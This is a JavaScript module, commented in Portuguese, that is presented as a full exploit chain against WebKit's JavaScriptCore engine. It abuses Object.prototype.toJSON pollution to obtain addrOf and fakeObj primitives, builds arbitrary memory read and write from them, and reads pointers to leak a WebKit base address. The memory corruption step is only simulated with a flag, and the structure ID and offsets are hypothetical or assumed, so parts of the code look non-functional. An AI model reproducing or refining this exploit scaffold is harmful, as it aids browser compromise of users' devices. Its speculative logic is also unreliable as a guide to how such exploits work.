// js/script3/testArrayBufferVictimCrash.mjs (v95_JSCHeapTC_FullChain - R56 - Cadeia de Exploit Completa)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V95_TCFC_R56_WEBKIT = "Heisenbug_JSCHeapTCFullChain_v95_TCFC_R56_WebKitLeak";

// --- Globais para a primitiva ---
let arrA, arrB;
let addrOf_primitive = null;
let fakeObj_primitive = null;
let arb_read_v2 = null;
let arb_write_v2 = null; // Adicionado para completude
let targetFunctionForLeak;

let confusion_trigger_flag = false;
const SIMPLE_OBJECT_STRUCTURE_ID = new AdvancedInt64(0x01082340); // VALOR HIPOTÉTICO

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low < 0x10000) return false;
    if ((high & 0xFFFF0000) === 0x7FFF0000) return false;
    return true;
}

const conversion_buffer = new ArrayBuffer(8);
const float_conversion_view = new Float64Array(conversion_buffer);
const int_conversion_view = new BigUint64Array(conversion_buffer);

function box(addr) {
    const val64 = (BigInt(addr.high()) << 32n) | BigInt(addr.low());
    int_conversion_view[0] = val64;
    return float_conversion_view[0];
}

function unbox(float_val) {
    float_conversion_view[0] = float_val;
    const val64 = int_conversion_view[0];
    const low = Number(val64 & 0xFFFFFFFFn);
    const high = Number((val64 >> 32n) & 0xFFFFFFFFn);
    return new AdvancedInt64(low, high);
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R56() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V95_TCFC_R56_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Cadeia de Exploit Completa (R56) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R56...`;
    
    let iter_primary_error = null;
    let iter_addrof_result = { success: false, msg: "Addrof (R56): Not run." };
    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R56): Not run." };
    
    const ppKey = 'toJSON';
    let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let polluted = false;

    try {
        logS3(`  --- Fase 1 (R56): Criação das Primitivas ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        arrA = new Float64Array(8);
        arrB = new Float64Array(8);
        arrA.fill(1.1);
        arrB.fill(2.2);
        targetFunctionForLeak = function someUniqueLeakFunctionR56_Instance() { return `target_R56_${Date.now()}`; };

        function simulate_corruption() {
             logS3(`  [SIMULAÇÃO] Corrompendo StructureID de arrB para ${SIMPLE_OBJECT_STRUCTURE_ID.toString(true)}`, 'warn');
             confusion_trigger_flag = true;
        }

        function toJSON_probe_R56() {
            if (this === arrB && confusion_trigger_flag) {
                Object.defineProperty(this, 'pwned', {
                    get: function() {
                        logS3(`  [GETTER] Getter 'pwned' acionado!`, 'vuln');
                        addrOf_primitive = (obj) => {
                            arrA[0] = obj;
                            return unbox(this[1]);
                        };
                        fakeObj_primitive = (addr) => {
                             this[1] = box(addr);
                             return arrA[0];
                        };
                        return "getter_finished";
                    },
                    enumerable: true
                });
                return this;
            }
            return this;
        }

        simulate_corruption();
        
        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_probe_R56, configurable: true, writable: true });
        polluted = true;
        
        JSON.stringify(arrB);

        if (!addrOf_primitive || !fakeObj_primitive) {
            throw new Error("Falha ao criar as primitivas addrOf/fakeObj.");
        }
        logS3("  SUCESSO: Primitivas addrOf e fakeObj criadas.", "good");

        logS3(`  --- Fase 2 (R56): Construção de Leitura/Escrita Arbitrária ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        // --- IMPLEMENTAÇÃO R56: Leitura/Escrita Arbitrária ---
        arb_read_v2 = (addr) => {
            // A estrutura de um Float64Array (ArrayBufferView) tem um cabeçalho e um ponteiro para seus dados.
            // Para ler de 'addr', criamos um objeto falso cujo ponteiro de dados (m_vector) aponta para 'addr'.
            // O m_vector está a um offset do início do objeto. Assumimos 16 bytes.
            const fake_obj_addr = addr.sub(new AdvancedInt64(0, 16));
            let fake_array = fakeObj_primitive(fake_obj_addr);
            return unbox(fake_array[0]);
        };
        arb_write_v2 = (addr, val) => {
            const fake_obj_addr = addr.sub(new AdvancedInt64(0, 16));
            let fake_array = fakeObj_primitive(fake_obj_addr);
            fake_array[0] = box(val);
        };
        logS3("  SUCESSO: Primitivas de Leitura/Escrita Arbitrária construídas.", "good");

        logS3(`  --- Fase 3 (R56): Validação e WebKit Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        let leaked_target_function_addr = addrOf_primitive(targetFunctionForLeak);
        logS3(`  [TESTE AddrOf] Endereço vazado de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");
        
        if (!isValidPointer(leaked_target_function_addr)) {
            throw new Error(`addrOf retornou um ponteiro inválido: ${leaked_target_function_addr.toString(true)}`);
        }
        iter_addrof_result = { success: true, msg: "addrOf obteve endereço com sucesso.", leaked_object_addr: leaked_target_function_addr.toString(true) };
        logS3("  [TESTE AddrOf] SUCESSO: Primitivas validadas.", "good");
        
        // --- IMPLEMENTAÇÃO R56: Cadeia de Leak ---
        const ptr_to_executable_instance = arb_read_v2(leaked_target_function_addr.add(new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET)));
        logS3(`  WebKitLeak: Ponteiro para ExecutableInstance: ${ptr_to_executable_instance.toString(true)}`, 'leak');
        if(!isValidPointer(ptr_to_executable_instance)) throw new Error("Ponteiro para ExecutableInstance inválido.");

        const ptr_to_jit_or_vm = arb_read_v2(ptr_to_executable_instance.add(new AdvancedInt64(0, 8))); // Assumindo offset 8 para JIT code
        logS3(`  WebKitLeak: Ponteiro para JIT/VM: ${ptr_to_jit_or_vm.toString(true)}`, 'leak');
        if(!isValidPointer(ptr_to_jit_or_vm)) throw new Error("Ponteiro para JIT/VM inválido.");

        const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
        const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb);
        
        iter_webkit_leak_result = { success: true, msg: `Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
        logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");
        
    } catch (e) {
        iter_primary_error = e;
        logS3(`  ERRO na iteração R56: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        console.error(`Erro na iteração R56:`, e);
    } finally {
        if (polluted) {
            if (origDesc) {
                Object.defineProperty(Object.prototype, ppKey, origDesc);
            } else {
                delete Object.prototype[ppKey];
            }
            logS3(`Restauração do Object.prototype.${ppKey} concluída.`, "info");
        }
    }

    let result = {
        errorOccurred: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
        addrof_result: iter_addrof_result,
        webkit_leak_result: iter_webkit_leak_result,
    };
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (R56): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return result;
}
